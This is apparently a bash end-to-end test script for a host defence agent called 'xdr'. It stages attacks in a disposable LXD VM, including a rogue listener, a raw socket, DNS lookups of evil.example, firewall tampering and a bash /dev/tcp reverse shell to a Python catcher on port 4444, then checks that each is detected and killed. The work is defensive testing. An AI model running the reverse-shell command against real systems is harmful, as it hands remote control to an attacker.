#!/bin/bash
# Live attacks against `xdr agent` on a real Ubuntu 24.04 VM (LXD). The host
# is the jump box, the attacker and the resolver. Commands go over lxc exec,
# which does not use the network, so the firewall cannot lock the test out.
# Prints "ok <case>" or "FAIL <case>: why" and ends with E2E-NET PASS.
#   XDR_E2E_KILL=false  runs the agent with "kill": false (the run must fail)
#   XDR_E2E_KEEP=1      leaves the VM running afterwards
set -uo pipefail
cd "$(dirname "$0")/../.."

VM=${XDR_E2E_VM:-xdr-e2e}
IMAGE=${XDR_E2E_IMAGE:-ubuntu:24.04}
KILL=${XDR_E2E_KILL:-true}
CONF=/etc/xdr/agent.json
BASE=/var/cache/xdr-e2e/base.json.gz
LOG=/var/lib/xdr/incidents.jsonl
# shellcheck source=test/vm/lib.sh
. test/vm/lib.sh

OUT=$(mktemp -d)
CATCH=""
cleanup() {
  [ -n "$CATCH" ] && kill "$CATCH" 2>/dev/null
  if [ "${XDR_E2E_KEEP:-}" != 1 ]; then lxc delete --force "$VM" >/dev/null 2>&1; fi
  rm -rf "$OUT"
}
trap cleanup EXIT


# An LXD client can stall with no operation behind it; fail rather than wait.
timeout 600 lxc launch "$IMAGE" "$VM" --vm || exit 1
for _ in $(seq 120); do x true >/dev/null 2>&1 && break; sleep 2; done
x systemctl is-system-running --wait >/dev/null || true
HOST=$(lxc network get lxdbr0 ipv4.address | cut -d/ -f1)
VMIP=$(x hostname -I | awk '{print $1}')
echo "== host $HOST, vm $VMIP"

lxc file push bin/xdr "$VM/usr/local/sbin/xdr" --mode 0755 || exit 1
lxc file push test/vm/svc.py "$VM/usr/local/sbin/svc.py" --mode 0755 || exit 1
x mkdir -p /etc/xdr /var/cache/xdr-e2e
python3 - "$HOST" "$KILL" > "$OUT/agent.json" <<'PY'
import json, sys
host, kill = sys.argv[1], sys.argv[2] == "true"
print(json.dumps({
    "host": "e2e",
    "jump": [host],
    "scored": [{"proto": "tcp", "port": 80}],
    # Filled in from `xdr listeners` below, as an operator does.
    "listeners": [],
    "dhcp_server": [host],
    "kill": kill,
    "dns": {"resolver": host, "hosts": {"scoring.test": "192.0.2.10"}},
}, indent=2))
PY
lxc file push "$OUT/agent.json" "$VM$CONF" --mode 0600 || exit 1
x systemd-run --unit=svc /usr/bin/python3 /usr/local/sbin/svc.py >/dev/null || exit 1
echo "== capture baseline"
x xdr capture --root / --out "$BASE" || exit 1
echo "== listeners before the agent (they go into the config)"
x xdr listeners --config "$CONF" > "$OUT/listeners.json" || exit 1
cat "$OUT/listeners.json"
python3 - "$OUT/agent.json" "$OUT/listeners.json" <<'PY' || exit 1
import json, sys
c = json.load(open(sys.argv[1]))
c["listeners"] = json.load(open(sys.argv[2]))
# sshd itself, for when it holds :22 after socket activation hands it over
c["listeners"].append({"proto": "tcp", "port": 22, "exe": "/usr/sbin/sshd"})
json.dump(c, open(sys.argv[1], "w"), indent=2)
PY
lxc file push "$OUT/agent.json" "$VM$CONF" --mode 0600 || exit 1

http() { curl -s -o /dev/null -w '%{http_code}' --max-time "${2:-3}" "http://$VMIP$1"; }
scored() { [ "$(http /)" = 200 ] || fail scored-reachable "VM:80 not 200 after $1"; }

# catch FILE: accept one connection on HOST:4444, append what arrives to
# FILE, and send whatever is written to FILE.send.
catch() {
  python3 - "$HOST" "$1" <<'PY' &
import os, select, socket, sys
host, out = sys.argv[1], sys.argv[2]
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, 4444))
s.listen(1)
f = open(out, "ab", 0)
c, _ = s.accept()
f.write(b"accepted\n")
while True:
    if os.path.exists(out + ".send"):
        data = open(out + ".send", "rb").read()
        os.unlink(out + ".send")
        try:
            c.sendall(data)
        except OSError:
            break
    if select.select([c], [], [], 0.2)[0]:
        try:
            d = c.recv(4096)
        except OSError:
            break
        if not d:
            break
        f.write(d)
PY
  CATCH=$!
  sleep 0.5
}
uncatch() { kill "$CATCH" 2>/dev/null; wait "$CATCH" 2>/dev/null; CATCH=""; }
accepted() { grep -q '^accepted' "$1" 2>/dev/null; }
# no_egress CASE: a connection from the VM to HOST:4444 does not get through.
no_egress() {
  : > "$OUT/probe"
  catch "$OUT/probe"
  x timeout 4 python3 -c "import socket; socket.create_connection(('$HOST', 4444), 3)" >/dev/null 2>&1
  sleep 0.5
  accepted "$OUT/probe" && fail "$1" "VM reached $HOST:4444"
  uncatch
}
SHELL_RE="^bash -i\$|/dev/tcp/$HOST/4444"
revshell() { bg "bash -c 'bash -i >& /dev/tcp/$HOST/4444 0>&1'"; }

[ "$(http /)" = 200 ] && ok scored-reachable || fail scored-reachable "VM:80 not 200 before the agent"

echo "== sensor-ebpf"
if start_agent && x grep -q '^sensor: ebpf$' "$ERR"; then ok sensor-ebpf
else fail sensor-ebpf "$(x cat "$ERR" | head -5)"; fi
scored sensor-ebpf

echo "== listener"
mark
bg "python3 -m http.server 4444"
sleep 0.3
code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 "http://$VMIP:4444/")
if [ "$code" != 000 ]; then fail listener "host reached VM:4444 ($code)"
elif ! gone 3 'http.server 4444'; then fail listener "the server still runs"
elif ! wait_inc 2 listener killed; then fail listener "no listener/killed incident"
else ok listener; fi
scored listener

echo "== revshell"
mark
: > "$OUT/rs1"
catch "$OUT/rs1"
revshell
if ! gone 3 "$SHELL_RE"; then fail revshell "the shell still runs"
elif ! wait_inc 2 egress killed "i.get('remote') == {'addr': '$HOST', 'port': 4444, 'proto': 'tcp'} and len(i.get('chain') or []) > 1"; then
  fail revshell "no egress/killed incident with remote and chain"
else
  sleep 2
  if accepted "$OUT/rs1"; then fail revshell "the host accepted a connection"; else ok revshell; fi
fi
uncatch
scored revshell

echo "== pre-existing-revshell"
stop_agent
x xdr fw remove
: > "$OUT/rs2"
catch "$OUT/rs2"
revshell
for _ in $(seq 40); do accepted "$OUT/rs2" && break; sleep 0.25; done
echo 'echo $((6*7))PRE' > "$OUT/rs2.send"
for _ in $(seq 20); do grep -q 42PRE "$OUT/rs2" && break; sleep 0.25; done
if ! grep -q 42PRE "$OUT/rs2"; then
  fail pre-existing-revshell "the shell did not work without the agent: $(head -c 200 "$OUT/rs2")"
  start_agent
else
  mark
  start_agent
  if ! gone 5 "$SHELL_RE"; then fail pre-existing-revshell "the shell still runs"
  elif ! wait_inc 2 revshell-stdio killed; then fail pre-existing-revshell "no revshell-stdio/killed incident"
  else
    echo 'echo $((6*7))AFTER' > "$OUT/rs2.send"
    sleep 3
    if grep -q 42AFTER "$OUT/rs2"; then fail pre-existing-revshell "the host still gets data"; else ok pre-existing-revshell; fi
  fi
fi
uncatch
scored pre-existing-revshell

echo "== service-shell"
mark
svc=$(x systemctl show -p MainPID --value svc)
code=$(http /run)
if [ "$code" != 200 ]; then fail service-shell "/run answered $code"
elif ! gone 3 'sleep 300'; then fail service-shell "the shell or its sleep still runs"
elif ! wait_inc 2 service-shell killed; then fail service-shell "no service-shell/killed incident"
elif [ "$(x systemctl show -p MainPID --value svc)" != "$svc" ]; then fail service-shell "svc.py was restarted or killed"
else ok service-shell; fi
scored service-shell

echo "== dns-off"
mark
got=$(x getent hosts scoring.test | awk '{print $1}')
t0=$(date +%s%N)
x getent hosts example.com >/dev/null; rc=$?
ms=$((($(date +%s%N) - t0) / 1000000))
rcode=$(x python3 -c '
import socket, struct
q = struct.pack(">HHHHHH", 0x5844, 0x0100, 1, 0, 0, 0)
q += b"".join(bytes([len(l)]) + l.encode() for l in "evil.example".split(".")) + b"\0" + struct.pack(">HH", 1, 1)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(2)
s.sendto(q, ("127.0.0.1", 53))
print(s.recv(512)[3] & 0xf)')
x python3 -c "
import socket
try: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'x', ('203.0.113.53', 53))
except OSError: pass" 2>/dev/null
if [ "$got" != 192.0.2.10 ]; then fail dns-off "scoring.test is '$got'"
elif [ $rc -eq 0 ] || [ $ms -ge 2000 ]; then fail dns-off "example.com: exit $rc after ${ms}ms"
elif [ "$rcode" != 3 ]; then fail dns-off "evil.example rcode '$rcode', want 3 (NXDOMAIN)"
elif ! wait_inc 2 dns-query alert "i.get('comm', '').startswith('python3') and 'evil.example' in i['detail']"; then
  fail dns-off "no dns-query incident naming python3 and evil.example"
elif ! wait_inc 2 dns ""; then fail dns-off "no dns incident for the send to 203.0.113.53:53"
else ok dns-off; fi
scored dns-off

echo "== dns-on"
conf "c['dns']['enabled'] = True; c['dns']['allow'] = ['$VM.lxd']"
hup
mark
if ! x getent hosts "$VM.lxd" >/dev/null; then fail dns-on "$VM.lxd does not resolve"
elif x getent hosts other.lxd >/dev/null; then fail dns-on "other.lxd resolves"
elif ! wait_inc 2 dns-query alert "'name=other.lxd ' in i['detail']"; then fail dns-on "no dns-query incident for other.lxd"
else ok dns-on; fi
scored dns-on

echo "== dns-expiry"
expires=$(x date -u -d '+5 seconds' +%Y-%m-%dT%H:%M:%SZ)
conf "c['dns']['expires'] = '$expires'"
hup
sleep 9
if x getent hosts "$VM.lxd" >/dev/null; then fail dns-expiry "$VM.lxd still resolves"; else ok dns-expiry; fi
conf "c['dns']['enabled'] = False; del c['dns']['expires']"
hup
scored dns-expiry

echo "== rawsock"
mark
bg "python3 -c 'import socket, time; s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); time.sleep(120)  # rawsock-e2e'"
if ! gone 3 rawsock-e2e; then fail rawsock "the raw-socket holder still runs"
elif ! wait_inc 2 rawsock killed; then fail rawsock "no rawsock/killed incident"
else ok rawsock; fi
scored rawsock

echo "== drift"
mark
x xdr fw remove
x sed -i 's/^hosts:.*/hosts: files dns/' /etc/nsswitch.conf
if ! wait_inc 6 fw-drift repaired; then fail drift "no fw-drift/repaired incident"
elif ! wait_inc 1 dns-files repaired "i['detail'] == '/etc/nsswitch.conf'"; then fail drift "no dns-files/repaired incident"
else ok drift; fi
no_egress drift
scored drift

echo "== foreign-nat"
mark
x nft add table ip sneaky
x nft add chain ip sneaky out '{ type nat hook output priority 0; }'
if wait_inc 6 fw-foreign alert "'ip sneaky/out' in i['detail']"; then ok foreign-nat
else fail foreign-nat "no fw-foreign incident for a nat chain after ours"; fi
x nft delete table ip sneaky
scored foreign-nat

echo "== agent-dead"
x systemctl kill -s KILL --kill-whom=main xdr-agent
sleep 1
before=$fails
no_egress agent-dead
[ "$(http /)" = 200 ] || fail agent-dead "VM:80 not 200 with the agent dead"
[ $fails -eq $before ] && ok agent-dead
x systemctl reset-failed xdr-agent 2>/dev/null

echo "== fallback"
if ! start_agent --sensor proc || ! x grep -q '^sensor: proc$' "$ERR"; then
  fail fallback "no 'sensor: proc' line: $(x cat "$ERR" | head -5)"
else
  mark
  : > "$OUT/rs3"
  catch "$OUT/rs3"
  revshell
  if ! gone 4 "$SHELL_RE"; then fail fallback "the shell still runs"
  elif ! wait_inc 2 egress killed "i.get('remote', {}).get('port') == 4444"; then fail fallback "no egress/killed incident"
  else ok fallback; fi
  uncatch
fi
scored fallback

echo "== incidents"
x xdr incidents --file "$LOG" > "$OUT/incidents.txt"; rc=$?
lines=$(x sh -c "wc -l < $LOG")
missing=""
for k in listener egress revshell-stdio service-shell dns-query dns rawsock fw-drift dns-files fw-foreign; do
  grep -q " $k " "$OUT/incidents.txt" || missing+=" $k"
done
if [ $rc -ne 0 ]; then fail incidents "exit $rc"
elif [ "$(wc -l < "$OUT/incidents.txt")" -ne "$lines" ]; then fail incidents "$(wc -l < "$OUT/incidents.txt") lines printed for $lines incidents"
elif [ -n "$missing" ]; then fail incidents "missing:$missing"
elif LC_ALL=C grep -qP '[\x00-\x08\x0b-\x1f\x7f]' "$OUT/incidents.txt"; then fail incidents "raw control bytes printed"
elif grep -E ' (listener|rawsock) .*/usr/lib/systemd/' "$OUT/incidents.txt"; then fail incidents "stock services listed by xdr listeners still raise alerts"
else ok incidents; fi

echo "== incident log"
cat "$OUT/incidents.txt"
echo "== agent stderr"
x sh -c 'tail -n 20 /var/log/xdr-agent.*.err'
stop_agent

if [ $fails -ne 0 ]; then
  echo "E2E-NET FAIL ($fails)"
  exit 1
fi
echo E2E-NET PASS
